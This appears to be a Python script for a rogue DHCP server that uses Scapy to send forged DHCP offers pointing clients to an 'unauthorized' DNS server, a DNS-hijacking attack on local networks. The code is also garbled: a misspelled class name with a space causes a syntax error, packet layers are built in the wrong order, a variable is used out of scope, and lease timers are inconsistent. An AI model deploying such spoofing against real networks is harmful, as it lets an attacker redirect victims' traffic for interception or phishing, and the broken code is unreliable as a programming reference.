#!/usr/bin/env python
import dhcp_server as dhcp
import socket
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, raw, dhcp_options

def handle_dhcp_request(packet):
    # Parse the incoming packet using Scapy
    dhcp_packet = DHCP(str(packet[BOOTP].payload))
    
    # Extract the transaction ID from the request
    xid = dhcp_packet.xid
    
    # Create a DHCP Offer response
    ip = "192.168.1.1"  # Example IP, should be decided based on network policy
    mac = packet[Ether].src
    yiaddr = ip
    siaddr = "255.255.255.255"  # Broadcast address
    
    # Build options for the DHCP response
    dhcp_opts = [
        ('message-type', 'offer'),
        ('server_id', siaddr),
        ('lease_time', 43200),
        ('renewal_time', 172800),
        ('rebinding_time', 518400),
        ('subnet_mask', '255.255.255.0'),
        ('router', ['192.168.1.1']),
        ('domain_name_server', [unauthorized_dns_server]),  # Add unauthorized DNS server
        ('end')
    ]
    
    # Create a DHCP packet for the response
    response = BOOTP(op=2, yiaddr=yiaddr, siaddr=siaddr, ciaddr='0.0.0.0', chaddr=mac)
    response = DHCP(options=dhcp_opts) / response
    
    # Construct the Ethernet and IP/UDP headers
    ethernet_frame = Ether(src=server.mac, dst=mac) / IP(src=siaddr, dst='255.255.255.255') / UDP(sport=67, dport=68) / response
    
    # Return the raw bytes of the Ethernet frame
    return raw(ethernet_frame)

def main():
    server = dhcp.DHCP Sever('0.0.0.0', 67)
    server.mac = "00:11:22:33:44:55"  # Example MAC, should be configured as per your system
    server.start()
    print("[+] DHCP server started on port 67")
    
    # Set the unauthorized DNS server address to be included in the DHCP response.
    global unauthorized_dns_server
    unauthorized_dns_server = "192.168.1.100"
    
    while True:
        packet = server.receive_packet()
        if packet:
            response = handle_dhcp_request(packet)
            if response:
                server.send_packet(response)
                print("[+] Modified DHCP response sent to client")

if __name__ == "__main__":
    main()